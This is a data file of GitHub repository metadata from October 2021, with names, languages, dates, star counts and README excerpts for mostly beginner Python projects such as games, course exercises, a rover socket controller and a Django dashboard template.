417633551;ftp;https://github.com/Pastorsin/ftp;Java;2021-10-15T20:56:43Z;0;0;0;FTP Server Análisis, desarrollo y comparación de un servidor FTP utilizando gRPC en los lenguajes Java y Python para la materia Programación Distribuida y Tiempo Real.  El código fuente se encuentra en el directorio src. En el archivo informe.pdf se encuentran las instrucciones para ejecutar el servidor, junto con el análisis y las conclusiones encontradas.  
417595356;Virtual-Whiteboard;https://github.com/joshtrivedi/Virtual-Whiteboard;Python;2021-10-15T18:16:31Z;1;1;0;Virtual-Whiteboard Project in python to draw using your finger 
417604169;DeveloperStash;https://github.com/VinayakMishraCoder/DeveloperStash;Java;2021-10-15T18:52:02Z;0;0;1;DeveloperStash 
417614267;fridge-cleaner;https://github.com/jia-yi-pan/fridge-cleaner;Python;2021-10-15T19:33:32Z;0;0;0;fridge-cleaner python program that allows you to keep inventory of your fridge, challenges you to make something based on what is in your fridge, and recommends recipes that you could make to get rid of the ingredients that are expiring soon! program has three modes: entry, challenge, and computer. entry mode enables you to log the items you get (you have the option of manually logging information about the item like 'date purchased' and 'approximate expiration' or having the computer log default information). challenge mode lets the computer randomly select 1-3 ingredients in your fridge and challenge you to make something with those ingredients. computer mode chooses ingredients in the fridge based on how close the expiration date is approaching. there are two json files that are created- the 'ingredients' and the 'meals' files because entries like leftovers and prepackaged meals are different from ingredients. this is my first complex project! please let me know what i can improve on as i would love to get some feedback. here are some ideas i have to improve the program moving forward: 1) make the program available on a gui or website 2) have a more accurate mechanism to autofill default values 3) have recipe recommendations from more than one site 4) allow user to store recipes of foods they can and like to make 5) give the user an option to pick a new recipe or familiar recipe 
417608280;Language_transcription_for_indian_accented_english;https://github.com/Teja-P-oss/Language_transcription_for_indian_accented_english;CSS;2021-10-15T19:08:17Z;1;1;0;Language_transcription_for_indian_accented_english This is a full stack web based application that prints the transcription for indian accented english. We take the help of model.pth file which contains the pretrained model for speech recognition The technologies used for this are Python, HTML, CSS, Flask, MySQL, Elliptic curve cryptography steps to run this application:- prerequisites: anaconda, pytorch, flask,flask_mysqldb,tinyec, hashlib,binascii,passlib.hash, xampp. install all the above packages after installing, step-1: open xampp and start apache, Mysql server step-2: create a database with name 'ecaf' step-3: create a table 'users' with attributes 'username' (VARCHAR with size 200), 'password' (VARCHAR with size 200) , dob (VARCHAR with size 200) step-4: open anaconda prompt and go to the project directory step-5: enter python server.py. step-6: Now open web browser and enter 127.0.0.1:5000/login. This will redirect to the login page. User needs to be registered before logging in .  step-7: Once the user is logged he can use the benefit of this application. Here is the picture of stored password which is encrypted using elliptic curve cryptography  step-8: after logging in, user will be redirected to the home page where he can upload a wav file and get the transcripts for the uploaded file  step-9: once if you click Myfiles option, we can see the history of previous uploadings of the user  
417615352;Text_Generator--Hyperskill;https://github.com/ikhanter/Text_Generator--Hyperskill;HTML;2021-10-15T19:38:22Z;0;0;0;
417649821;R3-SoftwareTask2-AhmadAlnoor;https://github.com/AhmadAlnoor/R3-SoftwareTask2-AhmadAlnoor;;2021-10-15T22:09:17Z;0;0;0;"R3-SoftwareTask2-AhmadAlnoor Repository that includes 2 python code that communicate with each other using socket. The input.py sends user input direction and speed entered using keyboard and converts it into motor direction (forward or reverse) and speed (0 to 255) In this project, the objective was to create two files (input.py and server.py) to control a 4 wheel rover. The input.py recieved input from the user using keyword and it was sent over to the server.py over the network to control the rover using Python programming language. The files and their implementation are mentioned below input.py implementation: input.py file is the file that takes the user input from the keyboard and sends it over the network to the server.py. The input.py accepts values from 0 to 5 to control the speed of the rove and accepts W, S, A, and D keys to control the rovers direction. In order to accept user input, ""pygame"" library was imported into the file so that its library could be used to decode which keys are pressed. Also, for network connection, ""socket"" was also imported. Before we get into the code, the pygame library and the network connection must be initalized: In order to use pygames library, ""pygame.init()"" must be called to initalize pygame for execution. Next, in order to set up a network between input.py and server.py, socket library's socket.socket function is called to initialize the iPv4 and TCP connections. Furthermore, the client (input.py) must connect to the server (server.py). To establish the connect, connect function was used to establish connection using the host connection name and a port number. For this project. ""socket.gethostname()"" function was called to connect to the host computers network and port number 5000 was chosen at random since the lower ports are already in use by other programs on the computer. To use pygame, a small display screen of 800x600 was also initialized. The screen is an interface that must be clicked in order for the program to accept input. It is a black screen that displays nothing. The commands that the code executes get displayed in the terminal instead. A speed variable is also initialzed to zero so that the robot is initally at rest and the speed must be manually changed. Now to the code: In the  ""if name == 'main':"", the first two lines are a welcome message and an introduction message to let the user know what the program is about. After the message, input.py goes into an infinite loop which starts to handle events. Events are triggered every time a key is pressed. In this infinite while loop, the program executes the events for all the 9 possible inputs the user can enter. ""for event in pygame.event.get():"" is a for loop that calls pygame.event.get() to see if any event has been triggered (if any button is pressed). The first if-condition in the for-loop looks for if the display screen has been close. If it has, the loop condition becomes false and input.py exits The second if-condition in the for-loop checks if a button-pressed type of event has been triggered. (pygame.KEYDOWN). If a button is pressed, then it checks for which 1 of the 9 buttons has been pressed.  if 0 has been pressed, then set the ""speed"" variable to 0 if 1 has been pressed, then set the ""speed"" variable to 1 if 2 has been pressed, then set the ""speed"" variable to 2 if 3 has been pressed, then set the ""speed"" variable to 3 if 4 has been pressed, then set the ""speed"" variable to 4 if 5 has been pressed, then set the ""speed"" variable to 5  For the W,A,S,and D keys, the if-condition is different. When they are pressed, instead of setting a variable, we send the speed and the respective direction to the server.py. The reason why we must send it when W,A,S, and D are pressed is because we have all the information to direct the rover. If W,A,S,and D are pressed before setting the rover speed, the speed by default is set to zero hence, we still have enough information to direct the rover. Except, when speed = 0, no matter which direction is pressed, the robot doesn't move. Therefore, if A has been pressed, send the speed information first over the network (in a string format) followed by the character ""A"" Similarly, for S,W,and D, the speed variable is also sent first followed by character ""S"", ""W"", and ""D"" when their respective keys are pressed. "
417632007;Udemy2021;https://github.com/lordevan/Udemy2021;C;2021-10-15T20:50:38Z;1;1;0;Udemy2021 Estrutura Sequencial  Exercicios em C - VisualG Aqui está algumas soluções dos exercícios da Udemy - Algoritmos e Lógica de Programação 2021 O curso definitivo de Lógica de Programação. Do VisualG às principais linguagens do mercado em C.  
417588433;GetDOS;https://github.com/The-Memzer/GetDOS;Python;2021-10-15T17:50:13Z;1;1;0;GetDOS This is a GET dos attacker, uses a voice thingy to make it seem a bit more cool. 
417653369;Hottest-Topics-in-Machine-Learning;https://github.com/jacquie0583/Hottest-Topics-in-Machine-Learning;Jupyter Notebook;2021-10-15T22:27:18Z;0;0;0;
417590975;NEAT-AI-Flappy-Bird;https://github.com/HubertSienicki/NEAT-AI-Flappy-Bird;Python;2021-10-15T18:00:09Z;0;0;0;
417587783;USAID-USG-Analytics-Apps-for-INGO;https://github.com/nzh2534/USAID-USG-Analytics-Apps-for-INGO;Python;2021-10-15T17:47:36Z;0;0;0;USAID/USG Analytics Apps for INGO Seven seperate Python programs that access USAspending.gov API and data.usaid.gov Foreign Assistance API, Google Sheets API, Pandas, and Plotly to create ~100 seperate visualizations for business development and analytics purposes. Countries filtered correspond with Food for the Hungry, Inc's current field offices as of 2021. 
417641369;keyboard-controller-remapper;https://github.com/crazycodestar/keyboard-controller-remapper;;2021-10-15T21:28:06Z;0;0;0;keyboard-controller-remapper this is a python based windows desktop ui system for remapping keyboard binds to controller - playstation -. this is also build spectifically for brawlhalla gameplay because of the intricate differences between the gameplay of the intricate differences between them inorder to accomodate for it 
417663174;Protocole_graphique;https://github.com/alplessier/Protocole_graphique;Python;2021-10-15T23:26:52Z;0;0;0;
417574255;Random-Password-Generator;https://github.com/krusher7/Random-Password-Generator;Python;2021-10-15T16:56:21Z;0;0;0;
417577843;Mini-DRS-System;https://github.com/sakshi81818/Mini-DRS-System;Jupyter Notebook;2021-10-15T17:09:21Z;0;0;0;Mini-DRS-System A python project , which uses open cv , pillow and imutils to play the video in four versions namely  slow, fast, fast reverse and slow reverse. It also uses tkinker to create a GUI so that the video plays as per user requirement. 
417746664;2021-python;https://github.com/kit8nino/2021-python;Python;2021-10-16T06:58:57Z;0;0;21;2021-python ННГАСУ практика по python Для работы необходим python 3.9 и выше. Библиотеки: numpy, matplotlib Редактор любой. Из неплохих: IDLE (родной, идёт вместе с установщиком), Visual Studio Code, notepad++, PyCharm, vim (для любителей сначала страдать, потом наслаждаться) Работа с блокнотами онлайн, с возможностью подключение удалённых мощностей гугла (GPU, TPU): https://colab.research.google.com/ Таблица, где я буду отмечать сданные работы: https://docs.google.com/spreadsheets/d/1QCHpZehe26M6ybqkQNUqSTkRFvf2qCnnfMgNk9N4L4M/edit?usp=sharing Сервер в Дискорд, где буду дублировать: https://discord.gg/MzPkCYf4Dh Мой контакт: nsmorozov@rf.unn.ru В своей папке можете делать все что угодно, в чужие не залезать, в корневую тоже. Я буду ориентироваться на файлы, где в названии будет номер лабораторной. 
417708499;PythonForEverybody_sampleCode;https://github.com/shivanianair/PythonForEverybody_sampleCode;Python;2021-10-16T03:53:15Z;0;0;5;Hacktoberfest 2021    PythonForEverybody_sampleCode Submit your python for everybody sample code in here 
417679497;python;https://github.com/Alladio/python;Python;2021-10-16T01:07:38Z;0;0;0;
417709403;python;https://github.com/mysteryjet/python;Python;2021-10-16T03:58:04Z;0;0;0;
417726945;PYTHON;https://github.com/ALEMA86/PYTHON;;2021-10-16T05:27:16Z;0;0;0;
417744413;Python;https://github.com/kedarayush03/Python;;2021-10-16T06:49:17Z;0;0;0;Python 
417719577;Python;https://github.com/Kainatbatool040/Python;;2021-10-16T04:50:39Z;0;0;0;Python Python 
417751055;python;https://github.com/Simon123-lab/python;;2021-10-16T07:17:41Z;0;0;0;python 
417723408;Python;https://github.com/shenglewang/Python;Python;2021-10-16T05:09:16Z;0;0;0;
417750296;python;https://github.com/DDDDDDylan/python;;2021-10-16T07:14:21Z;0;0;0;
417685735;python;https://github.com/LeoSoft941/python;CSS;2021-10-16T01:47:06Z;0;0;0;Django Bootstrap 5 Volt Admin dashboard generated by AppSeed in Django Framework. Volt Dashboard is a free and open source Bootstrap 5 Admin Dashboard featuring over 100 components, 11 example pages and 3 plugins with Vanilla JS. There are more than 100 free Bootstrap 5 components included some of them being buttons, alerts, modals, datepickers and so on.   Features   Up-to-date dependencies: Django 3.2.6 LTS SCSS compilation via Gulp UI-Ready app, SQLite Database, Django Native ORM Modular design, clean code-base Session-Based Authentication, Forms validation Deployment scripts: Docker, Gunicorn / Nginx Custom Admin Theme (free product)  Django Admin Volt   Support via Github and Discord.    Links   Django Bootstrap 5 Volt - product page Django Bootstrap 5 Volt - LIVE deployment Django Bootstrap 5 Volt - product documentation   Want more? Go PRO! PRO versions include Premium UI Kits, Lifetime updates and 24/7 LIVE Support (via Discord)    Django Datta PRO Django Soft PRO Django Volt PRO               How to use it $ # Get the code $ git clone https://github.com/app-generator/django-dashboard-volt.git $ cd django-dashboard-volt $ $ # Virtualenv modules installation (Unix based systems) $ virtualenv env $ source env/bin/activate $ $ # Virtualenv modules installation (Windows based systems) $ # virtualenv env $ # .\env\Scripts\activate $ $ # Install modules - SQLite Storage $ pip3 install -r requirements.txt $ $ # Create tables $ python manage.py makemigrations $ python manage.py migrate $ $ # Start the application (development mode) $ python manage.py runserver # default port 8000 $ $ # Start the app - custom port $ # python manage.py runserver 0.0.0.0:<your_port> $ $ # Access the web app in browser: http://127.0.0.1:8000/  Note: To use the app, please access the registration page and create a new user. After authentication, the app will unlock the private pages.   Enable Custom Admin Theme  Full Documentation available on PyPi and Github: Django Admin Volt  $ pip install django-admin-volt // OR $ pip install git+https://github.com/app-generator/django-admin-volt.git   Code-base structure The project is coded using a simple and intuitive structure presented bellow: < PROJECT ROOT >    |    |-- core/                               # Implements app configuration    |    |-- settings.py                    # Defines Global Settings    |    |-- wsgi.py                        # Start the app in production    |    |-- urls.py                        # Define URLs served by all apps/nodes    |    |-- apps/    |    |    |    |-- home/                          # A simple app that serve HTML files    |    |    |-- views.py                  # Serve HTML pages for authenticated users    |    |    |-- urls.py                   # Define some super simple routes      |    |    |    |-- authentication/                # Handles auth routes (login and register)    |    |    |-- urls.py                   # Define authentication routes      |    |    |-- views.py                  # Handles login and registration      |    |    |-- forms.py                  # Define auth forms (login and register)     |    |    |    |-- static/    |    |    |-- <css, JS, images>         # CSS files, Javascripts files    |    |    |    |-- templates/                     # Templates used to render pages    |         |-- includes/                 # HTML chunks and components    |         |    |-- navigation.html      # Top menu component    |         |    |-- sidebar.html         # Sidebar component    |         |    |-- footer.html          # App Footer    |         |    |-- scripts.html         # Scripts common to all pages    |         |    |         |-- layouts/                   # Master pages    |         |    |-- base-fullscreen.html  # Used by Authentication pages    |         |    |-- base.html             # Used by common pages    |         |    |         |-- accounts/                  # Authentication pages    |         |    |-- login.html            # Login page    |         |    |-- register.html         # Register page    |         |    |         |-- home/                      # UI Kit Pages    |              |-- index.html            # Index page    |              |-- 404-page.html         # 404 page    |              |-- *.html                # All other pages    |    |-- requirements.txt                     # Development modules - SQLite storage    |    |-- .env                                 # Inject Configuration via Environment    |-- manage.py                            # Start the app - Django default start script    |    |-- ************************************************************************   The bootstrap flow   Django bootstrapper manage.py uses core/settings.py as the main configuration file core/settings.py loads the app magic from .env file Redirect the guest users to Login page Unlock the pages served by app node for authenticated users   Recompile CSS To recompile SCSS files, follow this setup:  Step #1 - Install tools  NodeJS 12.x or higher Gulp - globally  npm install -g gulp-cli   Yarn (optional)   Step #2 - Change the working directory to assets folder $ cd apps/static/assets  Step #3 - Install modules (this will create a classic node_modules directory) $ npm install // OR $ yarn  Step #4 - Edit & Recompile SCSS files $ gulp scss The generated file is saved in static/assets/css directory.  Deployment The app is provided with a basic configuration to be executed in Docker, Gunicorn, and Waitress. Docker execution  The application can be easily executed in a docker container. The steps:  Get the code  $ git clone https://github.com/app-generator/django-dashboard-volt.git $ cd django-dashboard-volt  Start the app in Docker  $ sudo docker-compose pull && sudo docker-compose build && sudo docker-compose up -d Visit http://localhost:85 in your browser. The app should be up & running.  Gunicorn  Gunicorn 'Green Unicorn' is a Python WSGI HTTP Server for UNIX.  Install using pip  $ pip install gunicorn  Start the app using gunicorn binary  $ gunicorn --bind=0.0.0.0:8001 core.wsgi:application Serving on http://localhost:8001 Visit http://localhost:8001 in your browser. The app should be up & running.  Waitress  Waitress (Gunicorn equivalent for Windows) is meant to be a production-quality pure-Python WSGI server with very acceptable performance. It has no dependencies except ones that live in the Python standard library.  Install using pip  $ pip install waitress  Start the app using waitress-serve  $ waitress-serve --port=8001 core.wsgi:application Serving on http://localhost:8001 Visit http://localhost:8001 in your browser. The app should be up & running.  Credits & Links  Django - The official website Boilerplate Code - Index provided by AppSeed Boilerplate Code - Index published on Github    Django Bootstrap 5 Volt - Provided by AppSeed App Generator. 
417709061;Python;https://github.com/KanDev3/Python;;2021-10-16T03:56:20Z;0;0;0;
417749866;python;https://github.com/deependra9/python;Python;2021-10-16T07:12:24Z;0;0;0;python 
417727653;Python;https://github.com/Prasanjit-Singh/Python;Python;2021-10-16T05:30:23Z;0;0;0;
417719370;Python;https://github.com/Sricharitha-28/Python;;2021-10-16T04:49:12Z;0;0;0;
417711064;Python;https://github.com/Kishangupta1/Python;Jupyter Notebook;2021-10-16T04:05:35Z;0;0;0;
417746038;Python;https://github.com/ashishsabu/Python;;2021-10-16T06:56:13Z;0;0;0;
417670724;python;https://github.com/Catunima/python;Python;2021-10-16T00:11:20Z;0;0;0;python all my code write in python to practice in innovaccion microsoft 
417716559;python;https://github.com/gayatri-shelke/python;Python;2021-10-16T04:34:47Z;0;0;0;
417722403;Python;https://github.com/FAHMYPAIZIAH/Python;;2021-10-16T05:04:35Z;0;0;0;
417689218;python;https://github.com/sarahmahmood99/python;Python;2021-10-16T02:07:30Z;0;0;0;
417754145;python;https://github.com/Pythonprojec/python;Python;2021-10-16T07:31:31Z;1;1;0;
417684315;Python4ML;https://github.com/muyuhuatang/Python4ML;;2021-10-16T01:38:18Z;2;2;0;"Python4ML Python coding skills for Machine Learning studies/projects/research Author: Huang Fan, you can contact me through email: fhuang181@gmail.com Update plan: weekly, adding further details on each branch and example codes if necessary Simple Self-learning Websites In English: W3C school for python In Chinese: 廖雪峰Python教程 Examples of Introductory Python Online Courses  Coursera - Python for Everybody  Offered by University of Michigan Instructor: Charles R. Severance Duration: Approx. 19 hours to complete Python playground – environment Text editor – Atom variables, if-else, loops, functions It covers Chapters 1-5 of the textbook “Python for Everybody” (which is free to download from https://www.py4e.com/). Once a student completes this course, they will be ready to take more advanced programming courses.  LinkedIn Learning – Python Essential Training  Instructor: Bill Weinman Duration: 4h 45m Komodo platform It covers the basics of the language syntax and usage, as well as advanced features such as objects, generators, and exceptions. Learn how types and values are related to objects; how to use control statements, loops, and functions; and how to work with generators and decorators.  Kaggle – Python  This online course, complete with exercises, covers Python syntax, variable assignment, functions, Booleans, Conditionals, Lists, Loops, Strings, Dictionaries and Working with external libraries. reference from NTU Library workshop resources Great hands-on and practical books recommended by Prof. Jonathan Pan, NTU Automate the Boring Stuff with Python https://automatetheboringstuff.com/ A Programmer's Guide to Data Mining http://guidetodatamining.com/ Building Machine Learning Systems with Python - Third Edition Python Machine Learning By Example - Second Edition Coding ML with Keras keras examples: https://keras.io/examples/ https://keras.io/api/applications/ https://keras.io/examples/structured_data/wide_deep_cross_networks/ https://keras.io/examples/generative/ Deep Learning: Deep Learning with Keras by Antonio Gulli and Sujit Pal sklearn: https://scikit-learn.org/stable/modules/sgd.html Preprocessing: https://keras.io/api/preprocessing/ Coding Exercise kaggle Other Resources GYM toolkit of OPENAI for reinforcement learning: http://gym.openai.com/ Python hands-on codes for intrusion detection: https://github.com/PacktPublishing/Python-Digital-Forensics-Cookbook python regular expression: https://www.w3schools.com/python/python_regex.asp / https://www.liaoxuefeng.com/wiki/1016959663602400/1017639890281664 python visualization: Plotly: https://plotly.com/ "
417739825;python_in_one_video;https://github.com/Anuj-Kumar-Sharma/python_in_one_video;Python;2021-10-16T06:28:49Z;2;2;2;python_in_one_video Codebase for: https://www.youtube.com/watch?v=L5sZ6WgOnj0 
417756129;project_python_Assignment-1;https://github.com/schahinheidari/project_python_Assignment-1;Python;2021-10-16T07:41:27Z;2;2;0;
417739881;pythonnew2;https://github.com/eareshvarmac/pythonnew2;;2021-10-16T06:29:07Z;0;0;0;pythonnew2 
417724217;PythonWebpages;https://github.com/abwhitley/PythonWebpages;;2021-10-16T05:13:13Z;0;0;0;
417699606;pythonProject;https://github.com/ak14bbk30/pythonProject;;2021-10-16T03:03:43Z;0;0;0;
417695607;pythonbirds3;https://github.com/geovanipaz/pythonbirds3;Python;2021-10-16T02:42:37Z;0;0;0;" Python Birds Essa versão é a mais simples. Ela não contém replay nem reset, de forma que o jogo não pode retroceder. Para versão mais complexa, acesse a branch diversao Projeto para Ensino de Programação Orientadas a Objetos em Python. A versão utilizada para desenvolvimento foi Python 3.4 Um vídeo fala mais que 1000 palavras: Python Birds Contribuidores  Giovane Liberato Guido Luz Michel Amaral Renzo Nuccitelli  Abordagem Instalar Python 3. Baixar o zip do projeto (botão Download Zip) Os testes se encontram dentro do pacote ""testes"" e servem para definir a dinâmica das classes. Para rodar todos testes, execute: python executor_de_testes.py  Explicação detalhada sobre classes e métodos se encontram nos scripts atores.py e fase.py. Ordem de desenvolvimento A ordem preferida é começar pelos atores, seguindo a ordem dos testes presentes no script atores_testes.py. Depois passar para a fase_teste.py, onde é implementada uma fase. É possível emular um jogo que termina em vitória rodando: python fase_testes.py  É possível jogar a fase rodando: python placa_grafica_tkinter.py  Para jogar, utilize as setas para cima e para baixo. Para lançar, utilize a tecla enter ou espaço. Demonstração nos vídeos: Python Birds script atores.py Contém todos atores do projeto. script fase.py Contém classes respectivas a fase e ponto do plano cartesiano script placa_grafica.py Contém lógica para rodar jogo e exibir no console. script placa_grafica_tkinter.py Contém lógica para rodar jogo em uma janela. Simplificação do Jogo  Atores são pontos no plano cartesiano. A velocidade dos pontos é pequena, de tal forma que a cada passo os atores se movam apenas para pontos vizinhos. A colisão entre pontos ocorre quando eles estão em ponto vizinho, de acordo com valor de intervalo.  A seguir é apresentada a especificação detalhada do jogo. Classe Ator Classe base para todos atores do jogo. Método calcular_posicao Método que recebe o tempo (float) como parâmetro e retorna uma tupla com 2 elementos, posição horizontal (x) como primeiro elemento e posição vertical (y) como segundo. Método colidir O método colidir executa a lógica de colisão. A colisão só ocorre com atores ativos e que estejam em pontos vizinhos. Ao colidir, os atores envolvidos devem ter seus status alterado para DESTRUIDO Classe Obstaculo Classe que representa obstáculos na fase e que podem ser destruídos por pássaros. Herda de ator. Seu caracter de representação é a letra ""O"", quando ATIVO. Status Um obstáculo ao ter seu status alterado para DESTRUIDO deve ter seu caracter de apresentação alterado para "" "" (vazio). Assim ele vai ""sumir"" da tela. Classe Porco Classe que representa porcos na fase e que podem ser destruídos por pássaros. Herda de ator. Seu caracter de representação é a o caracter ""@"". Status Um obstáculo ao ter seu status alterado para DESTRUIDO deve ter seu caracter de apresentação alterado para ""+"" (sinal de mais). Assim sua imagem é alterada para a de porco morto. Passaro Classe base de todos os passáros. Cada tipo possui uma velocidade de lançamento (v). No lançamento o jogador escolhe o ângulo (teta), em graus, no qual o passáro deve ser lançado. O lançamento respeita as regras de lançamento oblíquo com gravidade (GRAVIDADE) constante e igual a 10 m/s^2. Método lancar O método lançar recebe o ângulo, em graus, que será feito o lançamento. Ele deve ser convertido para radianos. Cada pássaro deve armazenar esse valor e o tempo de lançamento para cálculo de sua posíção. Lembrar que o tempo das fórmulas é delta_t = T_final - T_inicial. Método de colidir_com_chao Todo pássaro que colidir com o chão (y<=0) deve ser destruído. Método foi_lançado Esse método deve retornar verdadadeiro se o pássaro foi lançado (tempo de lançamento é None). Caso contrário deve retornar falso. Lançamento Se o pássaro ainda não foi lançado, o pássaro deve permanecer na posição inicial. Caso tenha sido lançado e seu status esteja ATIVO, sua posição deve ser calculada de acordo com o lançamento oblíquo. Nesse caso, delta_t vai ser igual ao tempo do jogo menos o tempo do lançamento. Caso contrário, ele deve retornar a posição onde colidiu. Método posicao_horizontal Fórmula X=X0+v*cos(teta)*delta_t. Método posicao_vertical Fórmula Y=Y0+v*sen(teta)delta_t-(G*delta_t^2)/2. Classe Passaro Vermelho Tipo de Pássaro que representa o pássaro vermelho. Possui velocidade de lançamento igual a 20 m/s. Seu caracter quanto ATIVO é ""V"". Quando DESTRUIDO é ""v"". Classe Passaro Amarelo Tipo de Pássaro que representa o pássaro amarelo. Possui velocidade de lançamento igual a 30 m/s. Seu caracter quanto DESTRUIDO é ""a"". Classe Fase Classe responsável por organizar atores e transformar os dados em pontos a serem representados na tela. Método adicionar_obstaculo Método que adiciona um ou mais obstáculos na fase. Método adicionar_porco Método que adiciona um ou mais porcos na fase. Método adicionar_passaro Método que adiciona um ou mais pássaros na fase. Método status Recebe o tempo como parâmetro e retorna status do jogo.  Se o jogo está em andamento, retorna status ""EM_ANDAMENTO""; Se o jogo acabou e não existem porcos ativos, retorna STATUS ""VITORIA""; Se o jogo acabou e existem porcos ativos, retorna status ""DERROTA"".  Método lancar Recebe o ângulo e o tempo do lançamento. Deve delegar o lançamento ao primeiro pássaro ATIVO da lista de pássaros que ainda não foi lançado. Método calcular_pontos Método que executa a lógica do jogo a cada passo (tempo), retornando pontos a serem exibidos na tela. Ele deve:  Calcular a posição de cada pássaro, verificando se ele colidiu com algum obstáculo, porco ou chão. Retornar instâncias da classe Ponto, informando x, y e caracter respectivo a cada ator.  Divirta-se!!!! Powered by Python Pro Observação Importante Esse projeto usa somente o interpretador padrão do Python. Para fazer jogos com mais interatividade, existe a biblioteca Pygame. Ela não foi utilizada por motivos de simplicidade, para evitar que o aluno iniciante tenha dificuldades na hora de instalar o projeto. Contudo o Estevão Fonseca fez um versão com essa biblioteca, confira o projeto: https://github.com/estevaofon/angry-birds-python Ele também colocou esse vídeo no Youtube. "
417717138;PythonJournal;https://github.com/SarangMiraje/PythonJournal;Jupyter Notebook;2021-10-16T04:37:21Z;0;0;0;
417752721;PythonProjects;https://github.com/Roshini-2100/PythonProjects;Python;2021-10-16T07:25:06Z;0;0;0;PythonProjects 
417724319;PythonChallenge;https://github.com/etechcollab/PythonChallenge;;2021-10-16T05:13:38Z;0;0;0;PythonChallenge Udemy-Python sajjadanver-100 days of  code 
417701881;PythonProject;https://github.com/Teadeliver/PythonProject;Python;2021-10-16T03:16:10Z;0;0;0;
417686094;PythonProjects;https://github.com/forvaishali/PythonProjects;Python;2021-10-16T01:49:27Z;0;0;0;PythonProjects 
417741769;pythonObj;https://github.com/DuanYL1988/pythonObj;Python;2021-10-16T06:37:27Z;0;0;0;
417732501;PythonLearning;https://github.com/Sudhagar-N/PythonLearning;Python;2021-10-16T05:53:55Z;0;0;0;PythonLearning 
417754258;PythonArcadeGames;https://github.com/Pygeekdude/PythonArcadeGames;;2021-10-16T07:32:08Z;0;0;0;PythonArcadeGames A complete beginner tutorial . The module used in this program is random it is a system module no use of pip install for windows user this is for python 3.8. You need to know the basics input,print,if,else,random in python. Again this is for complete beginners with very little knowledge. 
417673028;pythonTestScrapper;https://github.com/SciencePotato/pythonTestScrapper;Python;2021-10-16T00:27:15Z;0;0;0;pythonTestScrapper Followng Dev Ed's Tutorial for Python Scapper 
417702627;PythonMachineLearning;https://github.com/ReedhamHackerman/PythonMachineLearning;;2021-10-16T03:20:28Z;0;0;0;
417722207;PythonCourse2021;https://github.com/plter/PythonCourse2021;;2021-10-16T05:03:48Z;0;0;0;PythonCourse2021 Python全栈课程的源码 
417689186;pythonProject2;https://github.com/GhostZcc/pythonProject2;;2021-10-16T02:07:19Z;0;0;0;
417723110;PythonTextAdventure;https://github.com/hampster2018/PythonTextAdventure;;2021-10-16T05:07:59Z;0;0;0;PythonTextAdventure A short python text adventure to learn Python 
417729885;pythonProject4;https://github.com/TaekminYoun/pythonProject4;;2021-10-16T05:39:35Z;0;0;0;
417705824;PythonPhysicsSimulator;https://github.com/Delotrium/PythonPhysicsSimulator;Python;2021-10-16T03:39:05Z;0;0;0;PythonPhysicsSimulator This is a simple physics engine built in python. So far the program is pretty limited, but more will be added soon! 
417733335;PythonCrashCourse;https://github.com/Zed0ck/PythonCrashCourse;Python;2021-10-16T05:59:13Z;0;0;0;PythonCrashCourse 
417711492;pythonProject1;https://github.com/RomanFigurado/pythonProject1;;2021-10-16T04:07:52Z;0;0;0;
417739079;pythonProject1;https://github.com/robshort2000/pythonProject1;Python;2021-10-16T06:25:32Z;0;0;0;
417683547;Python-;https://github.com/JAntonioMoraG/Python-;Python;2021-10-16T01:33:18Z;1;1;0;Autor: Mora Guzman Jose Antonio # Python Ejercicios que hice durante curso innovaccion  --Tutorial instalacion: tutorial de como descargar y configurar python con Visual Studio Code en Windows 10 --uso basico.py : programa sobre el uso basico de python --pokeapi.py: Programa que muestra la imagen del pokemon que ingresamos con ayuda de la pokeapi --tutorial instalacion librerias: explicacion de como instalar librerias matplotlib y rquests para python en vscode 
417752620;python-;https://github.com/sakshipadwal/python-;Python;2021-10-16T07:24:37Z;0;0;0;
417752539;PythonTick-Tac-Toe-Game;https://github.com/ManinderpreetPuri/PythonTick-Tac-Toe-Game;Python;2021-10-16T07:24:13Z;0;0;0;PythonTick-Tac-Toe-Game I have designed popular tick tac toe game in python. The game has static board size and is programmed in procedural and object oriented programming. 
417724440;Python3-Mundo1-CursoEmVideo;https://github.com/jeuchaves/Python3-Mundo1-CursoEmVideo;;2021-10-16T05:14:16Z;0;0;0;
417721546;pythonbaseball;https://github.com/carrjsn/pythonbaseball;Python;2021-10-16T05:01:08Z;0;0;0;python baseball interactive console-based baseball simulation program 
417728059;pythonblackjack;https://github.com/jglomsk/pythonblackjack;Python;2021-10-16T05:31:48Z;0;0;0;"pythonblackjack Just a small game The executable is under the name ""Blackjack"" The file named ""game"" in the base folder is the source code, written in python You're allowed to delete the ""Faces"" folder if you want, you just won't see any images Have fun :) "
417720605;pythoncgi;https://github.com/marwan4mr/pythoncgi;Python;2021-10-16T04:56:30Z;0;0;0;pythoncgi pushes a docker image of the files after meging from dev branch to main to dockerhub image 
417699753;pythonpro;https://github.com/jorge-trindade/pythonpro;;2021-10-16T03:04:36Z;0;0;0;pythonpro 
417704813;com.pythoncrashcourse2ndedition.6-9.favorite_places.py;https://github.com/enmorse/com.pythoncrashcourse2ndedition.6-9.favorite_places.py;Python;2021-10-16T03:32:37Z;0;0;0;
417707704;Python-Basics;https://github.com/JoydeepGhosh459/Python-Basics;;2021-10-16T03:49:29Z;0;0;0;
417734752;python_excersies;https://github.com/vpriyanka1819/python_excersies;Python;2021-10-16T06:05:54Z;0;0;0;python_excersies code for python training 
417710453;Learning_Python;https://github.com/KannanSnair/Learning_Python;Python;2021-10-16T04:02:56Z;0;0;0;
417707653;Python_Projects;https://github.com/QuackZ90/Python_Projects;;2021-10-16T03:49:10Z;0;0;0;Python_Projects 
417719618;python_fun;https://github.com/sanga3055/python_fun;Python;2021-10-16T04:50:53Z;0;0;0;
417746196;bi-python;https://github.com/leonidpodriz/bi-python;Python;2021-10-16T06:56:56Z;0;0;0;
417735644;python-projects;https://github.com/rasanjaya85/python-projects;Python;2021-10-16T06:09:32Z;0;0;0;python-projects Python projects 
417701251;python_course;https://github.com/gamyec/python_course;;2021-10-16T03:12:46Z;0;0;0;python_course my first steps in python programing My name is Gus and i live in ecu Add personal info 
417699054;Python_study;https://github.com/codingstair/Python_study;Python;2021-10-16T03:00:58Z;0;0;0;
417691920;cursoemvideo-python;https://github.com/andrebatist4/cursoemvideo-python;Python;2021-10-16T02:22:50Z;0;0;0;cursoemvideo-python Desafios do curso de Python 
417756777;python-learning;https://github.com/paulorodrigues99/python-learning;Jupyter Notebook;2021-10-16T07:44:33Z;0;0;0;
